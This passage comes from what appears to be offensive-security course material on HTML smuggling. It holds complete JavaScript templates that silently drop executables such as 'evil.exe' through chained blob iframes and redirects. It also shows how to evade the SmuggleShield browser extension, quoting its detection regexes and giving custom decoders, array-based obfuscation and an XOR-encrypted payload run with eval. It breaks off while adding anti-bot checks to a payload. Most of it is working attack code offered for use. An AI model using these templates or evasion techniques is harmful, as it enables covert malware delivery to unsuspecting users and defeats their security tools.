    link.style.display = "none";
    document.body.appendChild(link);

    setTimeout(() => {
    link.click();
    }, 50); // small delay
    </script>
</body>

```
The video can be found in folder: `./videos/embed-smuggle-chrome.mov`

## Embedding Blobs Improved: Chaining iFrames
Using the aforementioned technique, it's possible to chain as many iframes as needed, with each iframe loading the next blob layer, ultimately leading to the execution of the final payload. The diagram below illustrates the chaining of five blobs, where each blob loads the next until the fifth blob initiates the smuggling of the payload.

```
<body>
    <script>
    // Convert binary file to blob
    const base64Data = "TVqQAAMAAAA..."; // Base64 of the binary file
    const byteCharacters = atob(base64Data);
    const byteLength = new Array(byteCharacters.length);
    for (let i = 0; i < byteCharacters.length; i++) {
        byteLength[i] = byteCharacters.charCodeAt(i);
    }
    const byteArray = new Uint8Array(byteLength);
    const fileBlob = new Blob([byteArray], { type: "application/octet-stream" });
    const fileBlobUrl = URL.createObjectURL(fileBlob);

    // The fifth blob which triggers the download of the payload
    const blob5Content = `
    <html><body>
        <a id="downloadLink" href="${fileBlobUrl}" download="evil.exe"></a>
        <script>
        window.onload = function() {
            document.getElementById('downloadLink').click();
        }
        <\/script>
    </body></html>
    `;
    const blob5 = new Blob([blob5Content], { type: "text/html" });
    const blob5Url = URL.createObjectURL(blob5);

    // 4th blob iframe loading blob5
    const blob4Content = `
    <html><body>
        <iframe id="frame5" style="width:600px;height:400px;"></iframe>
        <script>
        window.onload = function() {
            document.getElementById('frame5').src = "${blob5Url}";
        }
        <\/script>
    </body></html>
    `;
    const blob4 = new Blob([blob4Content], { type: "text/html" });
    const blob4Url = URL.createObjectURL(blob4);

    // 3rd blob iframe loading blob4
    const blob3Content = `
    <html><body>
        <iframe id="frame4" style="width:600px;height:400px;"></iframe>
        <script>
        window.onload = function() {
            document.getElementById('frame4').src = "${blob4Url}";
        }
        <\/script>
    </body></html>
    `;
    const blob3 = new Blob([blob3Content], { type: "text/html" });
    const blob3Url = URL.createObjectURL(blob3);

    // 2nd blob iframe loading blob3
    const blob2Content = `
    <html><body>
        <iframe id="frame3" style="width:600px;height:400px;"></iframe>
        <script>
        window.onload = function() {
            document.getElementById('frame3').src = "${blob3Url}";
        }
        <\/script>
    </body></html>
    `;
    const blob2 = new Blob([blob2Content], { type: "text/html" });
    const blob2Url = URL.createObjectURL(blob2);

    // First blob iframe loading blob2
    // This blob is the one initially accessed
    const blob1Content = `
    <html><body>
        <iframe id="frame2" style="width:600px;height:400px;"></iframe>
        <script>
        window.onload = function() {
            document.getElementById('frame2').src = "${blob2Url}";
        }
        <\/script>
    </body></html>
    `;
    const blob1 = new Blob([blob1Content], { type: "text/html" });
    const blob1Url = URL.createObjectURL(blob1);

    const link = document.createElement("a");
    link.href = blob1Url; // Set the URL to blob 1
    link.style.display = "none";
    document.body.appendChild(link);

    setTimeout(() => {
        link.click();
    }, 50);
    </script>
</body>

```

## Embedding Blobs Improved: Chaining Redirections
Using the same approach as in the previous section, we can chain redirections instead of iframes. This still uses `window.onload`, but sets `window.location` to the next blob instead of an iframe source. Additionally, a two-second delay was added between each redirection to make the redirection flow more noticeable.

```
<body>
    <script>
    // Convert binary file to blob
    const base64Data = "TVqQAAMAAAA..."; // Base64 of the binary file
    const byteCharacters = atob(base64Data);
    const byteLength = new Array(byteCharacters.length);
    for (let i = 0; i < byteCharacters.length; i++) {
        byteLength[i] = byteCharacters.charCodeAt(i);
    }
    const byteArray = new Uint8Array(byteLength);
    const fileBlob = new Blob([byteArray], { type: "application/octet-stream" });
    const fileBlobUrl = URL.createObjectURL(fileBlob);

    // Blob 5 - Final page that triggers the download
    const blob5Content = `
    <html><body>
        <a id="downloadLink" href="${fileBlobUrl}" download="evil.exe"></a>
        <script>
        window.onload = function() {
            document.getElementById('downloadLink').click();
        }
        <\/script>
    </body></html>
    `;
    const blob5 = new Blob([blob5Content], { type: "text/html" });
    const blob5Url = URL.createObjectURL(blob5);

    // Blob 4 - Redirects to blob5 after 2000ms
    const blob4Content = `
    <html><body>
    <script>
    window.onload = function() {
        setTimeout(function() {
            window.location = "${blob5Url}";
        }, 2000);
    }
    <\/script>
    </body></html>
    `;
    const blob4 = new Blob([blob4Content], { type: "text/html" });
    const blob4Url = URL.createObjectURL(blob4);

    // Blob 3 - Redirects to blob4 after 2000ms
    const blob3Content = `
    <html><body>
    <script>
    window.onload = function() {
        setTimeout(function() {
            window.location = "${blob4Url}";
        }, 2000);
    }
    <\/script>
    </body></html>
    `;
    const blob3 = new Blob([blob3Content], { type: "text/html" });
    const blob3Url = URL.createObjectURL(blob3);

    // Blob 2 - Redirects to blob3 after 2000ms
    const blob2Content = `
    <html><body>
    <script>
    window.onload = function() {
        setTimeout(function() {
            window.location = "${blob3Url}";
        }, 2000);
    }
    <\/script>
    </body></html>
    `;
    const blob2 = new Blob([blob2Content], { type: "text/html" });
    const blob2Url = URL.createObjectURL(blob2);

    // Blob 1 - Redirects to blob2 after 2000ms
    const blob1Content = `
    <html><body>
    <script>
    window.onload = function() {
        setTimeout(function() {
            window.location = "${blob2Url}";
        }, 2000);
    }
    <\/script>
    </body></html>
    `;
    const blob1 = new Blob([blob1Content], { type: "text/html" });
    const blob1Url = URL.createObjectURL(blob1);

    const link = document.createElement("a");
    link.href = blob1Url;
    link.style.display = "none";
    document.body.appendChild(link);

    setTimeout(() => {
        link.click();
    }, 50);
    </script>
</body>

```
The video can be found in folder: `./videos/redir-chain.mov`

## Conclusion
This module demonstrated several ways of performing HTML smuggling in ways that differ from the original HTML smuggling template that is well-known and signatured.

## Objectives
Use Data URLs to smuggle a binary file

Chain ten iframes and have the final iframe smuggle a binary file

Obfuscate the code for one of the methods demonstrated in the module

Break up the large Base64 blob into smaller blobs and re-assemble them dynamically


---

# Novo Módulo 5 — Analisando e Evadindo o SmuggleShield

Novo Módulo 5 — Analisando e Evadindo o SmuggleShield

- # Novo Módulo 5 — Analisando e Evadindo o SmuggleShield

# Disclaimer
# Module 5 - Analyzing & Evading SmuggleShield

## Introduction
SmuggleShield is a browser extension created by RandomDhiraj that is capable of detecting and blocking HTML smuggling. The browser extension analyzes a website’s content for common patterns associated with HTML smuggling and applies machine learning techniques for further detection. The image below, taken from SmuggleShield's GitHub repository, shows how the extension works.This module will explore SmuggleShield's capabilities and discover ways of bypassing its detection mechanisms.
## Installing SmuggleShield
SmuggleShield works on Chrome and Microsoft Edge on Windows or Mac OS. In this module, we will be using SmuggleShield on the Chrome browser. To install SmuggleShield, start by cloning the GitHub repository using the command below:
```
git clone https://github.com/RootUp/SmuggleShield.git

```
Next, enable developer mode in the Chrome extension settings click on "Load unpacked".Finally, select the "SmuggleShield" folder and the extension will load into the browser.
Note: If you see errors upon loading the extension, they can be safely ignored as they will not impact the extension's functionality.

## Testing SmuggleShield
We begin by testing SmuggleShield's capabilities against the basic HTML smuggling template shown below.
```
<html>
    <body>
        <script>
            // Function to convert Base64 to Array buffer
            function base64ToArrayBuffer(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
                return bytes.buffer;
            }

            // Convert binary file to blob
            var file = '...'; // Base64 of the binary file
            var data = base64ToArrayBuffer(file);
            var blob = new Blob([data], {type: 'octet/stream'});

            // Create the blob URL
            var url = window.URL.createObjectURL(blob);

            // Dynamically create an <a> element and set the href attribute to the blob url
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            a.href = url;

            // Set the download attribute to the file name and simulate a click on the <a> element
            // This will trigger the download of 7zip.exe
            var fileName = '7zip.exe';
            a.download = fileName;
            a.click();

            // Revoke Blob URL
            window.URL.revokeObjectURL(url);
        </script>
    </body>
</html>

```
Notice that upon navigating to the page with the aforementioned HTML smuggling template, the binary file is not downloaded. The browser console displays information regarding the smuggling attempt that was blocked.The console displays the patterns that were detected, specifically:
`/atob\s*\([^)]+\).*new\s+uint8array/is` - This indicates the decoding of base64-encoded data using the `atob()` function followed by conversion into a binary array using the `Uint8Array` constructor.

- `/blob\s*\(\s*\[[^\]]+\]\s*,\s*\{\s*type\s*:\s*['"](?:application\/octet-stream|text\/html|octet\/stream)['"](?:\s*,\s*encoding\s*:\s*['"]base64['"])?\s*\}\s*\)/is` - This indicates the creation of a `Blob` object using the `Blob()` constructor with suspicious MIME types like `application/octet-stream` or `text/html`.

Through further testing we also saw additional patterns catching our HTML smuggling templates:

- `/\.click\s*\(\s*\).*url\.revokeobjecturl/is` - This indicates the invocation of the `.click()` method to simulate user interaction, followed by a call to `URL.revokeObjectURL()` to release the blob URL after use.

- `/url\.createobjecturl\s*\(\s*(?:my)?blob\s*\)/is` - This indicates a call to `URL.createObjectURL()` with a `Blob` object, commonly used to generate blob-based URLs for file download or inline execution.

## Bypass Strategy (1)
The first bypass strategy will try to work around the fixed pattern detection rules that were previously shown. Specifically, we will be implementing the following actions in our HTML smuggling template:

- A custom Base64-decoder to replace the usage of `atob()`.

- Indirect constructor call to `Uint8Array` with a variable length to avoid using a literal `Uint8Array(...)` expression.

- Use a benign MIME type such as `application/zip` and avoid the usage of `octet-stream` and `text/html`.

- Calling `window.URL.createObjectURL(blob)` indirectly through a variable reference.

- Using a `MouseEvent` to simulate a link click instead of calling the `.click()` method.

- Removing the `revokeObjectURL` call.

### DecodeBase64 Function
To start, we will create the function `decodeBase64`, which takes a Base64-encoded string and iterates through each character to decode it into binary form, then uses an indirect constructor call to `Uint8Array` to return the resulting byte array. This avoids triggering the rules searching for the usage of `atob()` and a direct `Uint8Array` constructor call with literal arguments.

```
// Custom base64 decoder function
function decodeBase64(base64Payload) {
    const base64 = base64Payload.replace(/[^A-Za-z0-9+/]/g, '');
    const output = [];
    const table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

    for (let i = 0, buffer = 0, bits = 0; i < base64.length; i++) {
        const val = table.indexOf(base64.charAt(i));
        if (val === -1) continue;

        buffer = (buffer << 6) | val;
        bits += 6;

        if (bits >= 8) {
        bits -= 8;
        output.push((buffer >> bits) & 0xff);
        }
    }

    // indirect Uint8Array constructor with variable length
    const length = output.length;
    const arrType = Uint8Array;
    const array = new arrType(length);
    for (let j = 0; j < length; j++) {
        array[j] = output[j];
    }

    return array;
}

```

### TriggerDownload Function
Next, we create the function `triggerDownload` that takes in two arguments:

- `data` - The Base64-decoded binary data.

- `filename` - The file name for the smuggled file.

This function uses a benign MIME type, `application/zip` for the created Blob, indirectly calls `URL.createObjectURL` and finally simulates a link click using `MouseEvent`, thus avoiding `.click()`.

```
function triggerDownload(data, filename) {
const blobData = new Blob([data], { type: 'application/zip' });

// Indirect createObjectURL usage
const makeURL = (self.URL || self.webkitURL).createObjectURL;
const url = makeURL(blobData);

// Dynamically creating the <a> element
const anchor = document.createElement('a');
anchor.href = url;
anchor.download = filename;
anchor.style.display = 'none';

document.body.appendChild(anchor);

// Simulating click
// Avoiding .click()
const evt = new MouseEvent('click', {
    view: window,
    bubbles: true,
    cancelable: true
});
anchor.dispatchEvent(evt);
}

```

### Entry Point
Lastly, we prepare our Base64-encoded payload, its file name, and call `decodeBase64` and `triggerDownload` to smuggle our payload.

```
const base64Payload = 'TVqQAAMAAAA...'; // Base64-encoded binary file
const fileName = '7zip.exe';

const byteArray = decodeBase64(base64Payload);
triggerDownload(byteArray, fileName);

```

### Complete Code
The complete code is shown below. Update the `base64Payload` and `filename` variables to your Base64-encoded payload and payload file name, respectively.

```
<html>
    <body>
        <script>
            // Custom base64 decoder function
            function decodeBase64(base64Payload) {
                const base64 = base64Payload.replace(/[^A-Za-z0-9+/]/g, '');
                const output = [];
                const table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

                for (let i = 0, buffer = 0, bits = 0; i < base64.length; i++) {
                    const val = table.indexOf(base64.charAt(i));
                    if (val === -1) continue;

                    buffer = (buffer << 6) | val;
                    bits += 6;

                    if (bits >= 8) {
                    bits -= 8;
                    output.push((buffer >> bits) & 0xff);
                    }
                }

                // indirect Uint8Array constructor with variable length
                const length = output.length;
                const arrType = Uint8Array;
                const array = new arrType(length);
                for (let j = 0; j < length; j++) {
                    array[j] = output[j];
                }

                return array;
            }

            function triggerDownload(data, filename) {
            const blobData = new Blob([data], { type: 'application/zip' });

            // Indirect createObjectURL usage
            const makeURL = (self.URL || self.webkitURL).createObjectURL;
            const url = makeURL(blobData);

            // Dynamically creating the <a> element
            const anchor = document.createElement('a');
            anchor.href = url;
            anchor.download = filename;
            anchor.style.display = 'none';

            document.body.appendChild(anchor);

            // Simulating click
            // Avoiding .click()
            const evt = new MouseEvent('click', {
                view: window,
                bubbles: true,
                cancelable: true
            });
            anchor.dispatchEvent(evt);
            }

            // Entry Point
            const base64Payload = 'TVqQAAMAAAA...'; // Base64-encoded binary file
            const fileName = '7zip.exe';

            const byteArray = decodeBase64(base64Payload);
            triggerDownload(byteArray, fileName);
        </script>
    </body>
</html>

```

### Demo
The video can be found in folder: `./videos/bypass-demo-1.mp4`

## Bypass Strategy (2)
Another way to bypass SmuggleShield is to obfuscate the frontend JavaScript in a way that does not trigger any of the detection patterns. Some obfuscation methods will continue to trigger the detection patterns and therefore these methods must be avoided. In the sections below, we'll demonstrate two obfuscation methods that successfully evade SmuggleShield.

### Array-Based Obfuscation
The first obfuscation method that we'll use is array-based obfuscation. This method stores all string literals in an array and accesses them by index. This obfuscation method works well against SmuggleShield because the strings in the array individually do not match a detection pattern but they do when used together at runtime.

For example, part of the original HTML smuggling template takes the Base64-encoded payload, decodes it into a string, calculates its length, and creates a `Uint8Array` to store its bytes.

```
var base64 = 'c2FtcGxlYmlu';
var decoded = window.atob(base64);
var length = decoded.length;
var byteArray = new Uint8Array(length);

```
We can obfuscate the code by taking every literal string used in the snippet and storing it in an array. In the example below, the array is named `_0x1a`, and we access the strings using their index in the array (e.g. `_0x1a[0]`, `_0x1a[1]`).

```
var _0x1a = [
  'c2FtcGxlYmlu', // index 0 (the payload)
  'atob',         // index 1
  'length',       // index 2
  'Uint8Array'    // index 3
];

// accesses window["atob"] (index 1) and calls it on index 0,
var _0x2b = window[_0x1a[1]](_0x1a[0]);

// accesses the "length" property (index 2) on the decoded payload
var _0x3c = _0x2b[_0x1a[2]];

// accesses window["Uint8Array"] (index 3) and calls it with the decoded length
var _0x4d = new window[_0x1a[3]](_0x3c);

```
Notice that in the obfuscated code we utilize the `window` object to dynamically access global functions and constructors without referring to them directly by name. This technique essentially allows us to resolve and invoke functions and constructors, such as `atob` and `Uint8Array`, through property lookups as shown below:

```
var decoded = window['atob']('c2FtcGxlYmlu');
var arr = new window['Uint8Array'](length);

```

### Array-Based Obfuscation: Complete Code
The complete obfuscated HTML smuggling template is shown below and wrapped in an Immediately-Invoked Function Expression (IIFE) to ensure that the code executes as soon as the script is loaded.

```
<html>
  <body>
    <script>
      !function(){
        var _0x1a = [
          'c2FtcGxlYmlu',
          'atob',
          'length',
          'charCodeAt',
          'Uint8Array',
          'buffer',
          'octet/stream',
          'Blob',
          'createObjectURL',
          'createElement',
          'a',
          'appendChild',
          'display: none',
          'href',
          '7zip.exe',
          'download',
          'click',
          'revokeObjectURL',
          'body',
          'URL'
        ];

        // Decode the base64 payload and prepare a byte array
        var _0x2b = window[_0x1a[1]](_0x1a[0]);
        var _0x3c = _0x2b[_0x1a[2]];
        var _0x4d = new window[_0x1a[4]](_0x3c);

        // Fill the byte array with decoded character codes
        for (var _0x5e = 0; _0x5e < _0x3c; _0x5e++) {
            _0x4d[_0x5e] = _0x2b[_0x1a[3]](_0x5e);
        }

        // Create a Blob from the byte array and generate a download URL
        var _0x6f = new window[_0x1a[7]]([_0x4d[_0x1a[5]]], { type: _0x1a[6] });
        var _0x7g = window[_0x1a[19]][_0x1a[8]](_0x6f);
        var _0x8h = document[_0x1a[9]](_0x1a[10]);

        // Create and trigger a hidden download link
        document[_0x1a[18]][_0x1a[11]](_0x8h);
        _0x8h.style = _0x1a[12];
        _0x8h[_0x1a[13]] = _0x7g;
        _0x8h[_0x1a[15]] = _0x1a[14];
        _0x8h[_0x1a[16]]();

        // Revoke the object URL to clean up
        window[_0x1a[19]][_0x1a[17]](_0x7g);

      }();
    </script>
  </body>
</html>

```

### Demo
The video can be found in folder: `./videos/obf-bypass-1.mp4`

### Modified XOR Obfuscation
The next obfuscation technique we'll use to bypass SmuggleShield is a slightly modified XOR version from the one used in Module 44 - Anti-Analysis Via XOR Obfuscation. The XOR encryption/decryption function is shown below for convenience.

```
function xorEncryptDecrypt(input, key, encode) {
    let output = '';
    const keyChar = key.charCodeAt(0);

    if (!encode) {
        input = decodeURIComponent(input);
    }

    // XOR
    for (let i = 0; i < input.length; i++) {
        let charCode = input.charCodeAt(i);
        let xorCharCode = charCode ^ keyChar;
        output += String.fromCharCode(xorCharCode);
    }

    if (encode) {
        output = encodeURIComponent(output);
    }

    return output;
}

```
This function is required in our HTML smuggling template because we will dynamically decrypt the encrypted HTML smuggling JavaScript code. However, this function is flagged by SmuggleShield, as shown below:

```
Detected patterns: /for\s*\([^)]+\)\s*\{[^}]*string\.fromcharcode\([^)]+\)/is, /string\.fromcharcode\(.*\)/is

```
The pattern detects loops that use `String.fromCharCode()` to reconstruct strings at runtime, which is commonly used in obfuscated or self-decrypting JavaScript payloads. With that in mind, the `xorEncryptDecrypt` function will also need to be obfuscated in order to avoid being flagged by SmuggleShield.

### Encrypting The HTML Smuggling Template
To start, use the unobfuscated `xorEncryptDecrypt` function to encrypt the HTML smuggling template. The code snippet below uses the key `xorEncryptDecrypt` function with the key `K` to encrypt the HTML smuggling template and prints the encrypted result to the console via `console.log`.

```
function xorEncryptDecrypt(input, key, encode) {
    let output = '';
    const keyChar = key.charCodeAt(0);

    if (!encode) {
        input = decodeURIComponent(input);
    }

    // XOR
    for (let i = 0; i < input.length; i++) {
        let charCode = input.charCodeAt(i);
        let xorCharCode = charCode ^ keyChar;
        output += String.fromCharCode(xorCharCode);
    }

    if (encode) {
        output = encodeURIComponent(output);
    }

    return output;
}

var input = `// Function to convert Base64 to Array buffer
            function base64ToArrayBuffer(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
                return bytes.buffer;
            }

            // Convert binary file to blob
            var file = 'c2FtcGxlYmlu'; // Base64 of the binary file
            var data = base64ToArrayBuffer(file);
            var blob = new Blob([data], {type: 'octet/stream'});

            // Create the blob URL
            var url = window.URL.createObjectURL(blob);

            // Dynamically create an <a> element and set the href attribute to the blob url
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            a.href = url;

            // Set the download attribute to the file name and simulate a click on the <a> element
            // This will trigger the download of 7zip.exe
            var fileName = '7zip.exe';
            a.download = fileName;
            a.click();

            // Revoke Blob URL
            window.URL.revokeObjectURL(url);`;

const key = 'K'; // Encryption key

// Encrypt & decrypt
var enc = xorEncryptDecrypt(input,key,true);
console.log("Encrypted: " + enc);

```

### Obfuscating The XorEncryptDecrypt Function
Next, we will need to obfuscate the `xorEncryptDecrypt` function as previously mentioned There are many ways to obfuscate it, for simplicity reasons we've opted to use Code Beautify's JavaScript Obfuscator.

```
function xorEncryptDecrypt(input, key, encode) {
const _0x1a78a0 = _0x24c4;
(function(_0x13d3e8, _0x4a8890) {
    const _0x59d791 = _0x24c4,
        _0x369330 = _0x13d3e8();
    while (!![]) {
        try {
            const _0x5a1f00 = parseInt(_0x59d791(0x1b2)) / (-0x27 * 0x7c + 0x8f * -0x23 + 0x26 * 0x103) + parseInt(_0x59d791(0x1af)) / (0x1288 + 0x1 * -0x577 + -0x1 * 0xd0f) + parseInt(_0x59d791(0x1aa)) / (-0x1 * 0xe47 + -0xdb8 + 0x1c02) + parseInt(_0x59d791(0x1b0)) / (0x1e91 + -0x3b * -0x61 + 0x4 * -0xd3a) + -parseInt(_0x59d791(0x1b1)) / (0x73 * -0x11 + -0xc5e * -0x3 + -0xeb9 * 0x2) + parseInt(_0x59d791(0x1ac)) / (0x1 * 0x129c + 0x58a * 0x4 + -0x2 * 0x145f) + -parseInt(_0x59d791(0x1ab)) / (-0x2635 + -0xd * -0x1a5 + 0x10db);
            if (_0x5a1f00 === _0x4a8890) break;
            else _0x369330['push'](_0x369330['shift']());
        } catch (_0x16491f) {
            _0x369330['push'](_0x369330['shift']());
        }
    }
}(_0x2733, -0x537d8 + 0xf6531 + 0x1 * 0x1fe4d));
let output = '';
const keyChar = key[_0x1a78a0(0x1ad)](0xd3c + 0x1 * 0x319 + -0x1055);
!encode && (input = decodeURIComponent(input));
for (let i = 0x94a + -0x63d * 0x4 + 0xfaa; i < input[_0x1a78a0(0x1b3)]; i++) {
    let charCode = input[_0x1a78a0(0x1ad)](i),
        xorCharCode = charCode ^ keyChar;
    output += String[_0x1a78a0(0x1ae) + 'de'](xorCharCode);
}
encode && (output = encodeURIComponent(output));

function _0x24c4(_0x44babb, _0x228840) {
    const _0x50989f = _0x2733();
    return _0x24c4 = function(_0x58a6f1, _0x563d52) {
        _0x58a6f1 = _0x58a6f1 - (-0x1225 + 0x115c + -0xd1 * -0x3);
        let _0x3cdeb2 = _0x50989f[_0x58a6f1];
        return _0x3cdeb2;
    }, _0x24c4(_0x44babb, _0x228840);
}
return output;

function _0x2733() {
    const _0x2f59c7 = ['2704464NjQpqS', '3466324lFWeGI', '4491545rqUkEd', '173959uGbmFv', 'length', '2796435TpRGbi', '18117113qCdYQw', '5754942JuBkht', 'charCodeAt', 'fromCharCo'];
    _0x2733 = function() {
        return _0x2f59c7;
    };
    return _0x2733();
}
}

```

### Modified XOR Obfuscation: Complete Code
The complete and updated HTML smuggling template is shown below. The code snippet uses the obfuscated version of `xorEncryptDecrypt` to dynamically decrypt the `encrypted` content (which is our XOR obfuscated HTML smuggling JavaScript code). Upon decryption, `eval` is called on the decrypted HTML smuggling JavaScript code in order to execute it.

Reminder: Replace the contents of the `encrypted` variable with your own XOR-obfuscated HTML smuggling code, and ensure that `K` matches the key used during the encryption process.

```
<html>
  <body>
    <script>
      function xorEncryptDecrypt(input, key, encode) {
	const _0x1a78a0=_0x24c4;(function(_0x13d3e8,_0x4a8890){const _0x59d791=_0x24c4,_0x369330=_0x13d3e8();while(!![]){try{const _0x5a1f00=parseInt(_0x59d791(0x1b2))/(-0x27*0x7c+0x8f*-0x23+0x26*0x103)+parseInt(_0x59d791(0x1af))/(0x1288+0x1*-0x577+-0x1*0xd0f)+parseInt(_0x59d791(0x1aa))/(-0x1*0xe47+-0xdb8+0x1c02)+parseInt(_0x59d791(0x1b0))/(0x1e91+-0x3b*-0x61+0x4*-0xd3a)+-parseInt(_0x59d791(0x1b1))/(0x73*-0x11+-0xc5e*-0x3+-0xeb9*0x2)+parseInt(_0x59d791(0x1ac))/(0x1*0x129c+0x58a*0x4+-0x2*0x145f)+-parseInt(_0x59d791(0x1ab))/(-0x2635+-0xd*-0x1a5+0x10db);if(_0x5a1f00===_0x4a8890)break;else _0x369330['push'](_0x369330['shift']());}catch(_0x16491f){_0x369330['push'](_0x369330['shift']());}}}(_0x2733,-0x537d8+0xf6531+0x1*0x1fe4d));let output='';const keyChar=key[_0x1a78a0(0x1ad)](0xd3c+0x1*0x319+-0x1055);!encode&&(input=decodeURIComponent(input));for(let i=0x94a+-0x63d*0x4+0xfaa;i<input[_0x1a78a0(0x1b3)];i++){let charCode=input[_0x1a78a0(0x1ad)](i),xorCharCode=charCode^keyChar;output+=String[_0x1a78a0(0x1ae)+'de'](xorCharCode);}encode&&(output=encodeURIComponent(output));function _0x24c4(_0x44babb,_0x228840){const _0x50989f=_0x2733();return _0x24c4=function(_0x58a6f1,_0x563d52){_0x58a6f1=_0x58a6f1-(-0x1225+0x115c+-0xd1*-0x3);let _0x3cdeb2=_0x50989f[_0x58a6f1];return _0x3cdeb2;},_0x24c4(_0x44babb,_0x228840);}return output;function _0x2733(){const _0x2f59c7=['2704464NjQpqS','3466324lFWeGI','4491545rqUkEd','173959uGbmFv','length','2796435TpRGbi','18117113qCdYQw','5754942JuBkht','charCodeAt','fromCharCo'];_0x2733=function(){return _0x2f59c7;};return _0x2733();}
      }

      var encrypted = "kkkkkkkkkkkkddk%0D%3E%25(%3F%22%24%25k%3F%24k(%24%25%3D.9%3Fk%09*8.%7D%7Fk%3F%24k%0A99*2k)%3E--.9Akkkkkkkkkkkk-%3E%25(%3F%22%24%25k)*8.%7D%7F%1F%24%0A99*2%09%3E--.9c)*8.%7D%7Fbk0Akkkkkkkkkkkk%3D*9k)%22%25*92%148%3F9%22%25%2Ckvk%3C%22%25%2F%24%3Ce*%3F%24)c)*8.%7D%7FbpAkkkkkkkkkkkk%3D*9k'.%25kvk)%22%25*92%148%3F9%22%25%2Ce'.%25%2C%3F%23pAkkkkkkkkkkkk%3D*9k)2%3F.8kvk%25.%3Ck%1E%22%25%3Fs%0A99*2ck'.%25kbpAkkkkkkkkkkkkkkkk-%249kc%3D*9k%22kvk%7Bpk%22kwk'.%25pk%22%60%60bk0k)2%3F.8%10%22%16kvk)%22%25*92%148%3F9%22%25%2Ce(%23*9%08%24%2F.%0A%3Fc%22bpk6Akkkkkkkkkkkkkkkk9.%3F%3E9%25k)2%3F.8e)%3E--.9pAkkkkkkkkkkkk6AAkkkkkkkkkkkkddk%08%24%25%3D.9%3Fk)%22%25*92k-%22'.k%3F%24k)'%24)Akkkkkkkkkkkk%3D*9k-%22'.kvkl(y%0D%3F(%0C3'%12%26'%3Elpkddk%09*8.%7D%7Fk%24-k%3F%23.k)%22%25*92k-%22'.Akkkkkkkkkkkk%3D*9k%2F*%3F*kvk)*8.%7D%7F%1F%24%0A99*2%09%3E--.9c-%22'.bpAkkkkkkkkkkkk%3D*9k)'%24)kvk%25.%3Ck%09'%24)c%10%2F*%3F*%16gk0%3F2%3B.qkl%24(%3F.%3Fd8%3F9.*%26l6bpAAkkkkkkkkkkkkddk%089.*%3F.k%3F%23.k)'%24)k%1E%19%07Akkkkkkkkkkkk%3D*9k%3E9'kvk%3C%22%25%2F%24%3Ce%1E%19%07e(9.*%3F.%04)!.(%3F%1E%19%07c)'%24)bpAAkkkkkkkkkkkkddk%0F2%25*%26%22(*''2k(9.*%3F.k*%25kw*uk.'.%26.%25%3Fk*%25%2Fk8.%3Fk%3F%23.k%239.-k*%3F%3F9%22)%3E%3F.k%3F%24k%3F%23.k)'%24)k%3E9'Akkkkkkkkkkkk%3D*9k*kvk%2F%24(%3E%26.%25%3Fe(9.*%3F.%0E'.%26.%25%3Fcl*lbpAkkkkkkkkkkkk%2F%24(%3E%26.%25%3Fe)%24%2F2e*%3B%3B.%25%2F%08%23%22'%2Fc*bpAkkkkkkkkkkkk*e8%3F2'.kvkl%2F%228%3B'*2qk%25%24%25.lpAkkkkkkkkkkkk*e%239.-kvk%3E9'pAAkkkkkkkkkkkkddk%18.%3Fk%3F%23.k%2F%24%3C%25'%24*%2Fk*%3F%3F9%22)%3E%3F.k%3F%24k%3F%23.k-%22'.k%25*%26.k*%25%2Fk8%22%26%3E'*%3F.k*k('%22(%20k%24%25k%3F%23.kw*uk.'.%26.%25%3FAkkkkkkkkkkkkddk%1F%23%228k%3C%22''k%3F9%22%2C%2C.9k%3F%23.k%2F%24%3C%25'%24*%2Fk%24-k%7C1%22%3Be.3.Akkkkkkkkkkkk%3D*9k-%22'.%05*%26.kvkl%7C1%22%3Be.3.lpAkkkkkkkkkkkk*e%2F%24%3C%25'%24*%2Fkvk-%22'.%05*%26.pAkkkkkkkkkkkk*e('%22(%20cbpAAkkkkkkkkkkkkddk%19.%3D%24%20.k%09'%24)k%1E%19%07Akkkkkkkkkkkk%3C%22%25%2F%24%3Ce%1E%19%07e9.%3D%24%20.%04)!.(%3F%1E%19%07c%3E9'bp";

      var decrypted = xorEncryptDecrypt(encrypted, 'K', false);
      eval(decrypted);
    </script>
  </body>
</html>

```

### Demo
The video can be found in folder: `./videos/xor-obf-demo.mp4`

## Conclusion
While this module demonstrated several evasion techniques targeting SmuggleShield, it's important to recognize that other security solutions or scanners may use similar pattern-matching approaches to detect HTML smuggling. The key takeaway is to understand how static analysis can be used to flag HTML smuggling and how specific modifications to the template can help evade such detection.

Due to the ongoing updates and improvements to SmuggleShield, the templates provided in this module may become ineffective over time. Therefore, understanding the underlying steps taken to achieve the evasion is more valuable, as it enables you to adapt and create new templates capable of bypassing future detection mechanisms.

## Acknowledgment
Special thanks to RandomDhiraj for developing SmuggleShield and for offering insights during the development of this module.

## Objectives
Install SmuggleShield and test the basic HTML smuggling template against it

Obfuscate the basic HTML smuggling template using Obfuscator.io's default settings. Does it evade SmuggleShield?

Analyze SmuggleShieldBypass1.html and determine how SmuggleShield's detection rules can be updated to detect it

Modify SmuggleShieldBypass2.html to obfuscate the plaintext content inside the array


---

# Novo Módulo 6 — Integrando Medidas Anti-Bot com HTML Smuggling

Novo Módulo 6 — Integrando Medidas Anti-Bot com HTML Smuggling

- # Novo Módulo 6 — Integrando Medidas Anti-Bot com HTML Smuggling

# Disclaimer
# Module 6 - Integrating Anti-Bot Measures With HTML Smuggling

## Introduction
When implementing anti-bot measures into HTML smuggling templates, we have the option of implementing the anti-bot checks prior to creating our initial Blob or performing the anti-bot checks within the generated Blob. In this module, we will demonstrate the latter method of implementing the anti-bot check within the Blob. The diagram below illustrates the anti-bot check process:In the code snippet below, a basic bot check is performed by evaluating whether `navigator.webdriver` is `true`. If it is, an image Blob is generated and rendered directly in the browser without triggering a download; otherwise, a Blob containing a payload is created and downloaded.
```
<html>
  <body>
    <script>
      const htmlContent = `
        <html>
        <body>
        <script>
          if (navigator.webdriver) {
